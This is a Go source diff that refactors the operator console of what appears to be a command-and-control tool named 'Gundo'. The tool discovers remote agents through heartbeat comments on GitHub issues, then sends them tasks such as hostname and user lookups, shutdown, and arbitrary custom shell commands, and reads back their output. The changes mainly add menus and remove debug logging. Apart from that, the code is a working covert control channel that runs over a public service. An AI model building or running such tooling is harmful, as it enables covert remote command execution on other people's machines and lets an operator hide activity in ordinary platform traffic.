@@ -1,10 +1,8 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 	"uuid"
@@ -76,16 +74,11 @@ func discoverClientsFromIssues(issues []IssueResponse, mailboxes map[int]discove
 
 		// receive comments to find heartbeat
 		comments, err := mailbox.Checkpoint.poll(issue.Number, list)
-		// fmt.Printf(
-		// 	"[DEBUG] Issue #%d returned %d comments\n",
-		// 	issue.Number,
-		// 	len(comments),
-		// )
 		if err != nil {
 			fmt.Printf(
-				"Could not read Issue #%d: %v\n",
+				"Could not read Issue #%d: %s\n",
 				issue.Number,
-				err,
+				consoleLabel(err.Error()),
 			)
 
 			clients = append(clients, managedClient)
@@ -97,35 +90,14 @@ func discoverClientsFromIssues(issues []IssueResponse, mailboxes map[int]discove
 		for i := len(comments) - 1; i >= 0; i-- {
 			message, err := parseGundoMessage(comments[i].Body)
 			if err != nil {
-				// fmt.Printf(
-				// 	"[DEBUG] Issue #%d comment %d parse failed: %v\n",
-				// 	issue.Number,
-				// 	comments[i].ID,
-				// 	err,
-				// )
 				continue
 			}
-
-			// fmt.Printf(
-			// 	"[DEBUG] Issue #%d | Type=%q ClientID=%q Timestamp=%q\n",
-			// 	issue.Number,
-			// 	message.Type,
-			// 	message.ClientID,
-			// 	message.Timestamp,
-			// )
 
 			if message.Type != "heartbeat" {
 				continue
 			}
 
-			fmt.Printf(
-				"[DEBUG] Heartbeat found. Expected client=%q Received client=%q\n",
-				clientID,
-				message.ClientID,
-			)
-
 			if message.ClientID != clientID {
-				fmt.Println("[DEBUG] Client IDs DO NOT match")
 				continue
 			}
 
@@ -134,20 +106,8 @@ func discoverClientsFromIssues(issues []IssueResponse, mailboxes map[int]discove
 				message.Timestamp,
 			)
 			if err != nil {
-				fmt.Printf(
-					"[DEBUG] Heartbeat timestamp parse failed: %v\n",
-					err,
-				)
 				continue
 			}
-
-			age := time.Since(heartbeatTime)
-
-			fmt.Printf(
-				"[DEBUG] Heartbeat age=%s threshold=%s\n",
-				age,
-				offlineThreshold,
-			)
 
 			managedClient.LastSeen = heartbeatTime
 
@@ -267,187 +227,127 @@ func waitForResultWithPolling(issueNumber int, taskID string, checkpoint comment
 	}
 }
 
-// using pointer to use the same terminal reader used in run controller
-func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
+// The menu selects existing actions; transport and result correlation stay shared.
+func runCommandMenu(console *operatorConsole, client ManagedClient) {
+	labels := []string{"Ping", "Get hostname", "Get operating system", "Get current user", "Custom command…", "Shutdown…", "Back to agents"}
+	actions := []string{"ping", "get_hostname", "get_os", "get_user", "custom", "shutdown"}
+	// Clear only when entering the agent; retain its action/result transcript.
+	console.screen()
+	console.agentHeading(client)
 	for {
-		fmt.Printf("\n=== Client %s ===\n", client.ClientID)
-
-		fmt.Println("1. Ping")
-		fmt.Println("2. Get Hostname")
-		fmt.Println("3. Get OS")
-		fmt.Println("4. Get User")
-		fmt.Println("5. Shutdown >:D")
-		fmt.Println("6. Custom Command")
-		fmt.Println("0. Back")
-		fmt.Print("\nSelect command: ")
-
-		input, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Printf("Error reading command: %v\n", err)
-			continue
-		}
-
-		// grab choice from the list
-		choice := strings.TrimSpace(input)
-
-		// determine action
-		var action string
-		var command string
-
-		switch choice {
-		case "1":
-			action = "ping"
-
-		case "2":
-			action = "get_hostname"
-
-		case "3":
-			action = "get_os"
-
-		case "4":
-			action = "get_user"
-
-		case "5":
-			action = "shutdown"
-
-		case "6":
-			action = "custom"
-			fmt.Print("\nEnter shell command: ")
-			raw, err := reader.ReadString('\n')
-			if err != nil {
-				fmt.Printf("Error reading command: %v\n", err)
-				continue
-			}
-			command = strings.TrimSpace(raw)
-			if command == "" {
-				fmt.Println("Empty command, aborted.")
-				continue
-			}
-			
-		case "0":
+		choice, err := console.selectItem("Select an action", labels)
+		if err != nil || choice == len(actions) {
 			return
-
-		default:
-			fmt.Println("Invalid command.")
-			continue
 		}
-
-		// create a task with the action and set the targetClientID with the
-		// client ID of the passed in client
+		action := actions[choice]
+		command := ""
+		if action == "custom" {
+			command, err = console.line("  Command (empty to cancel): ")
+			if err != nil {
+				return
+			}
+			if command == "" {
+				continue
+			}
+		}
+		if action == "shutdown" {
+			answer, err := console.line(fmt.Sprintf("  Shut down agent on Issue #%d? Type yes: ", client.IssueNumber))
+			if err != nil {
+				return
+			}
+			if answer != "yes" {
+				continue
+			}
+		}
 		task := createTaskMessage(action)
 		task.TargetClientID = client.ClientID
 		task.Command = command
-
-		fmt.Printf("\n[+] Sending %s\n", action)
-		fmt.Printf("[+] Task ID: %s\n", task.TaskID)
-
-		// creates comment with the task message
+		started := time.Now()
+		fmt.Fprintf(console.out, "\n  Sending %s · Issue #%d\n", labels[choice], client.IssueNumber)
+		if command != "" {
+			fmt.Fprintf(console.out, "  Command  %s\n", consoleLabel(command))
+		}
+		fmt.Fprintf(console.out, "  Task     %s\n", task.TaskID)
 		createdTask, err := createCommentWithMetadata(client.IssueNumber, task)
 		if err != nil {
-			fmt.Printf("Error sending task: %v\n", err)
+			console.failure(err)
 			continue
 		}
-
-		fmt.Println("[+] Waiting for result...")
-
-		// polling for the result from client execution
-		result, err := waitForResult(
-			client.IssueNumber,
-			task.TaskID,
-			// The POST response gives the boundary before a fast result can be
-			// missed by a separate baseline read. TaskID still correlates results.
-			commentCheckpoint{LastSeenCommentID: createdTask.ID, CreatedAt: createdTask.CreatedAt},
-		)
-
+		fmt.Fprintln(console.out, console.style("33", "  Task posted. Waiting for result…"))
+		result, err := waitForResult(client.IssueNumber, task.TaskID,
+			commentCheckpoint{LastSeenCommentID: createdTask.ID, CreatedAt: createdTask.CreatedAt})
 		if err != nil {
-			fmt.Printf("Error waiting for result: %v\n", err)
+			console.failure(err)
 			continue
 		}
-
-		// prints the results
-		fmt.Println("\n=== Result ===")
-		fmt.Printf("Status: %s\n", result.Status)
-		fmt.Printf("Output: %s\n", result.Output)
+		console.result(labels[choice], task.TaskID, result, time.Since(started))
 	}
 }
 
 func runController() {
-
-	// read buffer for terminal
-	reader := bufio.NewReader(os.Stdin)
-	// Keep discovery progress across menu refreshes, independent of result waits.
+	console := newOperatorConsole()
 	mailboxes := make(map[int]discoveryMailbox)
-
+	showOffline := true
 	for {
-		// creates list of clients
-
+		console.screen()
+		fmt.Fprintln(console.out, "\n  Discovering agents…")
 		clients, err := discoverClients(mailboxes)
 		if err != nil {
-			fmt.Printf("Failed to discover clients: %v\n", err)
-			return
-		}
-
-		if len(clients) == 0 {
-			fmt.Println("No Gundo clients found.")
-			return
-		}
-
-		fmt.Println("\n=== Gundo Clients ===")
-
-		// loop over each client
-		for i, client := range clients {
-			status := "OFFLINE"
-
-			if client.Online {
-				status = "ONLINE"
+			console.failure(err)
+			choice, selectErr := console.selectItem("Discovery failed", []string{"Retry discovery", "Quit"})
+			if selectErr != nil || choice == 1 {
+				return
 			}
-
-			// formatting to print each issue
-			fmt.Printf(
-				"%d. %s | Issue #%d | %s\n",
-				i+1,
-				client.ClientID,
-				client.IssueNumber,
-				status,
-			)
-		}
-
-		fmt.Println("0. Exit")
-		fmt.Print("\nSelect client: ")
-
-		input, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Printf("Error reading input: %v\n", err)
 			continue
 		}
-
-		// turn string to inpute to handle choice
-		choice, err := strconv.Atoi(strings.TrimSpace(input))
-		if err != nil {
-			fmt.Println("Invalid selection.")
-			continue
+		// Toggling visibility uses this snapshot and does not spend another API request.
+		firstView := true
+		notice := ""
+		for {
+			if !firstView {
+				console.screen()
+			}
+			firstView = false
+			online := 0
+			for _, client := range clients {
+				if client.Online {
+					online++
+				}
+			}
+			fmt.Fprintf(console.out, "\n  AGENTS  ·  %s  ·  %s\n", console.style("32", fmt.Sprintf("%d online", online)), console.style("32", fmt.Sprintf("%d offline", len(clients)-online)))
+			if notice != "" {
+				fmt.Fprintln(console.out, "  "+notice)
+				notice = ""
+			}
+			visible := visibleAgents(clients, showOffline)
+			if len(visible) == 0 {
+				fmt.Fprintln(console.out, "  No agents in this view. Refresh or show offline agents.")
+			}
+			labels := console.agentLabels(visible)
+			toggle := "Show offline agents"
+			if showOffline {
+				toggle = "Hide offline agents"
+			}
+			labels = append(labels, "Refresh agents", toggle, "Quit")
+			choice, err := console.selectItem("Select an agent", labels)
+			if err != nil || choice == len(visible)+2 {
+				return
+			}
+			if choice == len(visible)+1 {
+				showOffline = !showOffline
+				continue
+			}
+			if choice == len(visible) {
+				break
+			}
+			selected := visible[choice]
+			if !selected.Online {
+				notice = "This agent is offline. Refresh after it starts sending heartbeats."
+				continue
+			}
+			runCommandMenu(console, selected)
+			break
 		}
-
-		if choice == 0 {
-			return
-		}
-
-		// invalid client check
-		if choice < 1 || choice > len(clients) {
-			fmt.Println("Invalid client.")
-			continue
-		}
-
-		// represents the struct at the index of the client choice
-		selected := clients[choice-1]
-
-		if !selected.Online {
-			fmt.Println("[-] Client is currently offline.")
-			continue
-		}
-
-		// run commands based off the selected
-		runCommandMenu(reader, selected)
 	}
 }
 
